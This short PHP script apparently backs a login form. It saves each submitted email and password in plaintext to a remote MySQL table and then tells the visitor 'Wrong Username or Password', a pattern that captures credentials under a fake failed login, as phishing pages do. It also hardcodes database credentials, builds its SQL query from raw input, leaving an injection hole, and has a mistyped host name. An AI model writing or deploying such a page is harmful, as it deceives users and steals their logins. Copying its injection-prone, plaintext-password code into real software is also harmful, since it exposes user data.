<?php
if(isset($_POST['email'])&&isset($_POST['password']))
{
$email=$_POST['email'];
$password=$_POST['password'];
$con=new mysqli("starinsurance.mysql.database.azure.comt","myadmin","Server@1","newproject");
$q="insert into users(email,password)values('$email','$password')";
$r=mysqli_query($con,$q);
if($r)
{
    echo "<div class='message'>
    <p>Wrong Username or Password</p>
    </div> <br>";
    echo "<a href='login.php'><button class='btn'>Go Back</button>";
}
}

?>








